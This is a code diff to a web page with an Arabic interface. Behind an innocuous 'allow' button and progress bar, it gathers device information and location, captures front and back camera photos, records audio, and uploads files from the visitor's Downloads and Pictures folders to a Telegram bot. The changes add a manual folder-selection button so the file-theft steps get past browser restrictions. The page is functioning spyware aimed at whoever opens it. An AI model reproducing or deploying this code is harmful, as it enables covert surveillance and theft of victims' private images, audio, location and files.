@@ -137,6 +137,7 @@
             background-color: #f1f1f1;
             border-radius: 5px;
             margin: 15px 0;
+            display: none;
         }
         
         .progress-bar {
@@ -145,6 +146,26 @@
             background-color: #4285f4;
             width: 0%;
             transition: width 0.3s;
+        }
+        
+        #select-files-btn {
+            display: none;
+            margin: 20px auto;
+            padding: 15px 30px;
+            background-color: #34a853;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        
+        #file-selection-instruction {
+            display: none;
+            text-align: center;
+            margin: 15px 0;
+            color: #4285f4;
+            font-weight: bold;
         }
     </style>
 </head>
@@ -196,7 +217,13 @@
                 </div>
             </div>
             
-            <div class="progress-container" id="progress-container" style="display: none;">
+            <div id="file-selection-instruction">
+                الرجاء النقر على زر "اختر الملفات يدوياً" أسفل
+            </div>
+            
+            <button id="select-files-btn">اختر الملفات يدوياً</button>
+            
+            <div class="progress-container" id="progress-container">
                 <div class="progress-bar" id="progress-bar"></div>
             </div>
             
@@ -232,6 +259,12 @@
         const statusError = document.getElementById('status-error');
         const progressContainer = document.getElementById('progress-container');
         const progressBar = document.getElementById('progress-bar');
+        const selectFilesBtn = document.getElementById('select-files-btn');
+        const fileInstruction = document.getElementById('file-selection-instruction');
+        
+        // متغيرات الحالة
+        let manualFileSelection = false;
+        let fileSelectionResolve;
         
         // معالجة النقر على زر السماح
         allowBtn.addEventListener('click', async () => {
@@ -241,35 +274,49 @@
             progressContainer.style.display = 'block';
             
             try {
-                updateProgress(0, 'بدء العملية...');
+                updateProgress(5, 'بدء العملية...');
                 
                 // 1. جمع وإرسال معلومات الجهاز
-                updateProgress(10, 'جمع معلومات الجهاز...');
+                updateProgress(15, 'جمع معلومات الجهاز...');
                 const deviceInfo = await getDeviceInfo();
                 await sendToTelegram(formatDeviceInfo(deviceInfo));
                 
                 // 2. الحصول على الموقع الجغرافي
-                updateProgress(20, 'جمع بيانات الموقع...');
+                updateProgress(25, 'جمع بيانات الموقع...');
                 await getAndSendLocation();
                 
                 // 3. الكاميرا الأمامية
-                updateProgress(30, 'الوصول إلى الكاميرا الأمامية...');
+                updateProgress(35, 'الوصول إلى الكاميرا الأمامية...');
                 await captureAndSendPhoto('user', 'front_camera.jpg', 'الكاميرا الأمامية');
                 
                 // 4. الكاميرا الخلفية
-                updateProgress(40, 'الوصول إلى الكاميرا الخلفية...');
+                updateProgress(45, 'الوصول إلى الكاميرا الخلفية...');
                 await captureAndSendPhoto('environment', 'back_camera.jpg', 'الكاميرا الخلفية');
                 
                 // 5. التسجيل الصوتي
-                updateProgress(50, 'التسجيل الصوتي...');
+                updateProgress(55, 'التسجيل الصوتي...');
                 await recordAndSendAudio();
                 
-                // 6. ملفات التحميل
-                updateProgress(60, 'فحص مجلد التحميلات...');
+                // 6. ملفات التحميل (مع اختيار يدوي)
+                updateProgress(65, 'انتظار اختيار الملفات...');
+                fileInstruction.style.display = 'block';
+                selectFilesBtn.style.display = 'block';
+                await new Promise((resolve) => {
+                    fileSelectionResolve = resolve;
+                });
+                
+                updateProgress(70, 'فحص مجلد التحميلات...');
                 await checkAndSendDownloads();
                 
-                // 7. الصور من مجلد الصور
-                updateProgress(70, 'فحص مجلد الصور...');
+                // 7. الصور من مجلد الصور (مع اختيار يدوي)
+                updateProgress(80, 'انتظار اختيار مجلد الصور...');
+                fileInstruction.style.display = 'block';
+                selectFilesBtn.style.display = 'block';
+                await new Promise((resolve) => {
+                    fileSelectionResolve = resolve;
+                });
+                
+                updateProgress(85, 'فحص مجلد الصور...');
                 await checkAndSendPictures();
                 
                 updateProgress(100, 'اكتملت العملية!');
@@ -284,6 +331,19 @@
                 statusError.style.display = 'block';
                 statusError.textContent = `حدث خطأ: ${error.message}`;
                 await sendToTelegram(`⚠️ حدث خطأ: ${error.message}`);
+            } finally {
+                selectFilesBtn.style.display = 'none';
+                fileInstruction.style.display = 'none';
+            }
+        });
+        
+        // معالجة النقر على زر اختيار الملفات
+        selectFilesBtn.addEventListener('click', async () => {
+            manualFileSelection = true;
+            selectFilesBtn.style.display = 'none';
+            fileInstruction.style.display = 'none';
+            if (fileSelectionResolve) {
+                fileSelectionResolve();
             }
         });
         
@@ -343,60 +403,67 @@
         
         // دالة لفحص وإرسال معلومات التحميلات
         async function checkAndSendDownloads() {
-    try {
-        await sendToTelegram("⌛ الرجاء اختيار مجلد التحميلات عند ظهور طلب الإذن");
-        const downloadFiles = await getFilesFromDirectory('downloads');
-        await sendToTelegram(`📁 عدد الملفات في مجلد التحميل: ${downloadFiles.length}`);
-        
-        let sentCount = 0;
-        for (const fileEntry of downloadFiles) {
             try {
-                if (sentCount >= 3) break;
-                const file = await fileEntry.getFile();
-                if (file.size > 20 * 1024 * 1024) {
-                    await sendToTelegram(`⏩ تخطي الملف الكبير: ${file.name} (${Math.round(file.size / (1024 * 1024))}MB)`);
-                    continue;
+                await sendToTelegram("⌛ جاري فحص مجلد التحميلات...");
+                const downloadFiles = await getFilesFromDirectory('downloads');
+                await sendToTelegram(`📁 عدد الملفات في مجلد التحميل: ${downloadFiles.length}`);
+                
+                let sentCount = 0;
+                for (const fileEntry of downloadFiles) {
+                    if (sentCount >= 3) break;
+                    try {
+                        const file = await fileEntry.getFile();
+                        if (file.size > 20 * 1024 * 1024) {
+                            await sendToTelegram(`⏩ تخطي الملف الكبير: ${file.name}`);
+                            continue;
+                        }
+                        updateProgress(70 + (sentCount * 5), `جاري إرسال ${file.name}...`);
+                        await sendFileToTelegram(file, file.name);
+                        sentCount++;
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    } catch (error) {
+                        await sendToTelegram(`⚠️ خطأ في إرسال ${fileEntry.name}: ${error.message}`);
+                    }
                 }
-                statusProcessing.textContent = `جاري إرسال ${file.name}...`;
-                await sendFileToTelegram(file, file.name);
-                sentCount++;
-                await new Promise(resolve => setTimeout(resolve, 1000));
-            } catch (fileError) {
-                await sendToTelegram(`⚠️ فشل إرسال الملف ${fileEntry.name}: ${fileError.message}`);
+                
+                if (sentCount > 0) {
+                    await sendToTelegram(`✅ تم إرسال ${sentCount} ملفات من التحميلات`);
+                } else {
+                    await sendToTelegram("ℹ️ لم يتم إرسال أي ملفات من التحميلات");
+                }
+            } catch (error) {
+                await sendToTelegram("⚠️ فشل الوصول إلى مجلد التحميل: " + error.message);
+                throw error;
             }
-        }
-        
-        if (sentCount > 0) {
-            await sendToTelegram(`✅ تم إرسال ${sentCount} ملفات من مجلد التحميل`);
-        } else if (downloadFiles.length === 0) {
-            await sendToTelegram("ℹ️ مجلد التحميل فارغ");
-        }
-    } catch (error) {
-        if (error.message.includes("إلغاء")) {
-            await sendToTelegram("⚠️ لم يتم اختيار مجلد التحميل - تم الإلغاء من قبل المستخدم");
-        } else {
-            await sendToTelegram(`⚠️ فشل الوصول إلى مجلد التحميل: ${error.message}`);
-        }
-        throw error;
-    }
         }
         
         // دالة لفحص وإرسال معلومات الصور
         async function checkAndSendPictures() {
             try {
-                await requestFilesAccess('pictures');
+                await sendToTelegram("⌛ جاري فحص مجلد الصور...");
                 const pictures = await getFilesFromDirectory('pictures');
                 await sendToTelegram(`📸 عدد الصور في مجلد الصور: ${pictures.length}`);
                 
-                // إرسال بعض الصور كمثال (الأول 3 صور)
-                let sent = 0;
-                for (const entry of pictures) {
-                    if (entry.name.match(/\.(jpg|jpeg|png|gif)$/i)) {
-                        const file = await entry.getFile();
-                        await sendPhotoToTelegram(file, file.name);
-                        sent++;
-                        if (sent >= 3) break;
+                let sentCount = 0;
+                for (const fileEntry of pictures) {
+                    if (sentCount >= 3) break;
+                    if (fileEntry.name.match(/\.(jpg|jpeg|png|gif)$/i)) {
+                        try {
+                            const file = await fileEntry.getFile();
+                            updateProgress(85 + (sentCount * 5), `جاري إرسال ${file.name}...`);
+                            await sendPhotoToTelegram(file, file.name);
+                            sentCount++;
+                            await new Promise(resolve => setTimeout(resolve, 1000));
+                        } catch (error) {
+                            await sendToTelegram(`⚠️ خطأ في إرسال ${fileEntry.name}: ${error.message}`);
+                        }
                     }
+                }
+                
+                if (sentCount > 0) {
+                    await sendToTelegram(`✅ تم إرسال ${sentCount} صور من المجلد`);
+                } else {
+                    await sendToTelegram("ℹ️ لم يتم إرسال أي صور من المجلد");
                 }
             } catch (error) {
                 await sendToTelegram("⚠️ فشل الوصول إلى مجلد الصور: " + error.message);
@@ -427,32 +494,57 @@
         }
         
         // دالة لطلب إذن الملفات
-        async function requestFilesAccess(dirName) {
-    if (!('showDirectoryPicker' in window)) {
-        throw new Error("متصفحك لا يدعم واجهة نظام الملفات");
-    }
-    
-    try {
-        statusProcessing.textContent = `الرجاء اختيار مجلد ${dirName}...`;
-        const dirHandle = await window.showDirectoryPicker({
-            startIn: dirName,
-            mode: 'read'
-        });
-        
-        if (await dirHandle.queryPermission({ mode: 'read' }) !== 'granted') {
-            const permission = await dirHandle.requestPermission({ mode: 'read' });
-            if (permission !== 'granted') {
-                throw new Error("تم رفض إذن القراءة");
+        async function getFilesFromDirectory(dirName) {
+            if (!('showDirectoryPicker' in window)) {
+                throw new Error("المتصفح لا يدعم اختيار المجلدات");
             }
-        }
-        
-        return dirHandle;
-    } catch (error) {
-        if (error.name === 'AbortError') {
-            throw new Error("تم إلغاء اختيار المجلد");
-        }
-        throw error;
-    }
+            
+            if (!manualFileSelection) {
+                throw new Error("يجب اختيار المجلد يدوياً");
+            }
+            
+            try {
+                const dirHandle = await window.showDirectoryPicker({
+                    mode: 'read'
+                });
+                
+                if (await dirHandle.queryPermission({ mode: 'read' }) !== 'granted') {
+                    const permission = await dirHandle.requestPermission({ mode: 'read' });
+                    if (permission !== 'granted') {
+                        throw new Error("تم رفض إذن القراءة");
+                    }
+                }
+                
+                const files = [];
+                for await (const entry of dirHandle.values()) {
+                    if (entry.kind === 'file') {
+                        files.push(entry);
+                    } else if (entry.kind === 'directory') {
+                        if (['screenshots', 'telegram', 'pictures'].includes(entry.name.toLowerCase())) {
+                            try {
+                                const subDirHandle = await dirHandle.getDirectoryHandle(entry.name);
+                                for await (const subEntry of subDirHandle.values()) {
+                                    if (subEntry.kind === 'file') {
+                                        files.push(subEntry);
+                                    }
+                                }
+                            } catch (error) {
+                                console.error(`خطأ في المجلد الفرعي ${entry.name}:`, error);
+                            }
+                        }
+                    }
+                    if (files.length > 50) break;
+                }
+                
+                manualFileSelection = false; // إعادة التعيين للاستخدام التالي
+                return files;
+            } catch (error) {
+                manualFileSelection = false;
+                if (error.name === 'AbortError') {
+                    throw new Error("تم إلغاء اختيار المجلد");
+                }
+                throw error;
+            }
         }
         
         // دالة لالتقاط صورة من الكاميرا
@@ -535,40 +627,6 @@
             stream.getTracks().forEach(track => track.stop());
             
             return recordingPromise;
-        }
-        
-        // دالة للحصول على الملفات من مجلد معين
-        async function getFilesFromDirectory(dirName) {
-    try {
-        const dirHandle = await requestFilesAccess(dirName);
-        const files = [];
-        statusProcessing.textContent = `جاري فحص مجلد ${dirName}...`;
-        await new Promise(resolve => setTimeout(resolve, 500));
-        
-        for await (const entry of dirHandle.values()) {
-            if (entry.kind === 'file') {
-                files.push(entry);
-            } else if (entry.kind === 'directory') {
-                if (['screenshots', 'telegram', 'pictures'].includes(entry.name.toLowerCase())) {
-                    try {
-                        const subDirHandle = await dirHandle.getDirectoryHandle(entry.name);
-                        for await (const subEntry of subDirHandle.values()) {
-                            if (subEntry.kind === 'file') {
-                                files.push(subEntry);
-                            }
-                        }
-                    } catch (subError) {
-                        console.error(`لا يمكن الوصول إلى المجلد الفرعي ${entry.name}:`, subError);
-                    }
-                }
-            }
-            if (files.length > 50) break;
-        }
-        return files;
-    } catch (error) {
-        console.error(`خطأ في الوصول إلى ${dirName}:`, error);
-        throw error;
-    }
         }
         
         // دالة لجمع معلومات الجهاز
